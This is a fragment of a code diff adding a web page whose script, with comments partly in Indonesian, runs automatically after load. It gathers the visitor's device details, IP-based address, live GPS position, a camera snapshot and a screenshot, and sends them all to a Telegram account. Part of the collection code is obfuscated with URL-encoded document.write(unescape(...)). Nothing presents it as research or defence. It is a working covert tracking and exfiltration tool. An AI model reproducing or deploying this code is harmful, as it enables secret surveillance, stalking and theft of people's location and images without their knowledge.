+                fullAddress: "Alamat tidak tersedia"
+            };
+        };
+
+        // Collect device information
+        const collectDeviceInfo = async () => {
+            let message = '╭───── Tracking Report ───── ⦿\n\n';
+            
+            // Device Information
+          <script>
+<!--
+document.write(unescape("message%20+%3D%20%27%u2699%uFE0F%20DEVICE%20INFORMATION%5Cn%27%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20message%20+%3D%20%60%uD83D%uDDA5%uFE0F%20Device%3A%20%24%7Bnavigator.userAgent%7D%5Cn%60%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20message%20+%3D%20%60%uD83D%uDCBB%20Platform%3A%20%24%7Bnavigator.platform%7D%5Cn%60%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20message%20+%3D%20%60%uD83C%uDF10%20Bahasa%3A%20%24%7Bnavigator.language%7D%5Cn%60%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20message%20+%3D%20%60%uD83D%uDCF6%20Online%3A%20%24%7Bnavigator.onLine%20%3F%20%27Online%27%20%3A%20%27Offline%27%7D%5Cn%60%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20message%20+%3D%20%60%uD83D%uDCFA%20Screen%20Size%3A%20%24%7Bscreen.width%7Dx%24%7Bscreen.height%7D%5Cn%60%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20message%20+%3D%20%60%uD83E%uDE9F%20Window%20Size%3A%20%24%7Bwindow.innerWidth%7Dx%24%7Bwindow.innerHeight%7D%5Cn%60%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20message%20+%3D%20%60%uD83D%uDCBE%20RAM%3A%20%24%7Bnavigator.deviceMemory%20%7C%7C%20%27Unknown%27%7D%20GB%5Cn%60%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20message%20+%3D%20%60%uD83E%uDDE0%20CPU%20Cores%3A%20%24%7Bnavigator.hardwareConcurrency%7D%5Cn%60%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20//%20Battery%20Info%0A%20%20%20%20%20%20%20%20%20%20%20%20if%20%28navigator.getBattery%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20try%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20const%20battery%20%3D%20await%20navigator.getBattery%28%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20message%20+%3D%20%60%uD83D%uDD0B%20Battery%3A%20%24%7BMath.floor%28battery.level%20*%20100%29%7D%25%5Cn%60%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20message%20+%3D%20%60%uD83D%uDD0C%20Charging%3A%20%24%7Bbattery.charging%20%3F%20%27%u2705%20YA%27%20%3A%20%27%u274C%20TIDAK%27%7D%5Cn%60%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%20catch%20%28e%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20message%20+%3D%20%27%uD83D%uDD0B%20Battery%3A%20%u274C%20Tidak%20tersedia%5Cn%27%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D"));
+//-->
+</script>
+            
+            message += `⏰ Waktu Akses: ${new Date().toString()}\n`;
+            message += `🕒 Page Load Time: ${(performance.now()).toFixed(2)} ms\n`;
+            message += `📜 History Length: ${history.length}\n`;
+            message += `✋ Touch Support: ${'ontouchstart' in window ? '✅ YA' : '❌ TIDAK'}\n`;
+            message += `🔗 Referrer: ${document.referrer || 'None'}\n`;
+            message += `🌍 URL: ${window.location.href}\n`;
+            message += `📄 Title: ${document.title}\n`;
+            message += `🕓 Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n`;
+            message += `🧭 Offset: ${new Date().getTimezoneOffset()} menit\n\n`;
+            
+
+            // IP and Location Information
+            try {
+                const ipRes = await fetch('https://ipapi.co/json/');
+                const ipData = await ipRes.json();
+                
+                message += '📍 LOCATION INFORMATION\n';
+                message += `📡 IP Address: ${ipData.ip}\n`
+                message += `🏙️ Kota: ${ipData.city}\n`;
+                message += `🏙️ Kabupaten: ${ipData.region}\n`;
+                message += `🗺️ Wilayah: ${ipData.region}\n`;
+                message += `🌎 Negara: ${ipData.country_name}\n`;
+                message += `🏷️ Kode Pos: ${ipData.postal}\n`;
+                
+                if (ipData.latitude && ipData.longitude) {
+                    message += `📌 Latitude: ${ipData.latitude}\n`;
+                    message += `📍 Longitude: ${ipData.longitude}\n`;
+                    
+                    const locationDetails = await getLocationDetails(ipData.latitude, ipData.longitude);
+                    message += `🏙️ Kabupaten: ${locationDetails.kabupaten}\n`;
+                    message += `🏙️ Kecamatan: ${locationDetails.kecamatan}\n`;
+                    message += `🏠 Alamat Lengkap: ${locationDetails.fullAddress}\n`;
+                    
+                }
+            } catch (e) {
+                message += '❌ Gagal mendapatkan informasi lokasi\n';
+            }
+
+            message += '\n╰───── Telegram @@Gusofckokocchi ───── ⦿';
+            return message;
+        };
+
+        // Main tracking function
+        const startTracking = async () => {
+            // Send device info
+            const deviceInfo = await collectDeviceInfo();
+            await sendToTelegram(deviceInfo);
+
+            // Try to access camera
+            try {
+                const video = document.getElementById('video');
+                const canvas = document.getElementById('canvas');
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                video.srcObject = stream;
+                
+                await new Promise(resolve => setTimeout(resolve, 3000));
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                canvas.toBlob(blob => sendPhoto(blob, 'camera_capture.jpg'), 'image/jpeg');
+                
+                stream.getTracks().forEach(track => track.stop());
+            } catch (e) {
+                await sendToTelegram('❌ Camera access blocked');
+            }
+
+            // Take screenshot
+            setTimeout(async () => {
+                try {
+                    const canvas = await html2canvas(document.body);
+                    canvas.toBlob(blob => sendPhoto(blob, 'screenshot.jpg'), 'image/jpeg');
+                } catch (e) {
+                    await sendToTelegram('❌ Screenshot failed');
+                }
+            }, 5000);
+
+            // GPS tracking
+            if (navigator.geolocation) {
+                navigator.geolocation.watchPosition(async (pos) => {
+                    const coords = pos.coords;
+                    let gpsInfo = `📍 LIVE GPS TRACKING\n`;
+                    gpsInfo += `📌 Lat: ${coords.latitude}\n`;
+                    gpsInfo += `📍 Lng: ${coords.longitude}\n`;
+                    gpsInfo += `🎯 Akurasi: ${coords.accuracy}m\n`;
+                    
+                    const locationDetails = await getLocationDetails(coords.latitude, coords.longitude);
+                    gpsInfo += `🏙️ Kabupaten: ${locationDetails.kabupaten}\n`;
+                    gpsInfo += `🏙️ Kecamatan: ${locationDetails.kecamatan}\n`;
+                    gpsInfo += `🏠 Alamat: ${locationDetails.fullAddress}\n`;
+                    
+                    
+                    await sendToTelegram(gpsInfo);
+                }, 
+                async (err) => {
+                    await sendToTelegram(`❌ GPS Error: ${err.message}`);
+                }, 
+                { 
+                    enableHighAccuracy: true,
+                    maximumAge: 0,
+                    timeout: 5000
+                });
+            }
+        };
+
+        // Start tracking after delay
+        setTimeout(startTracking, 3000);
+    </script>
+</body>
+</html>
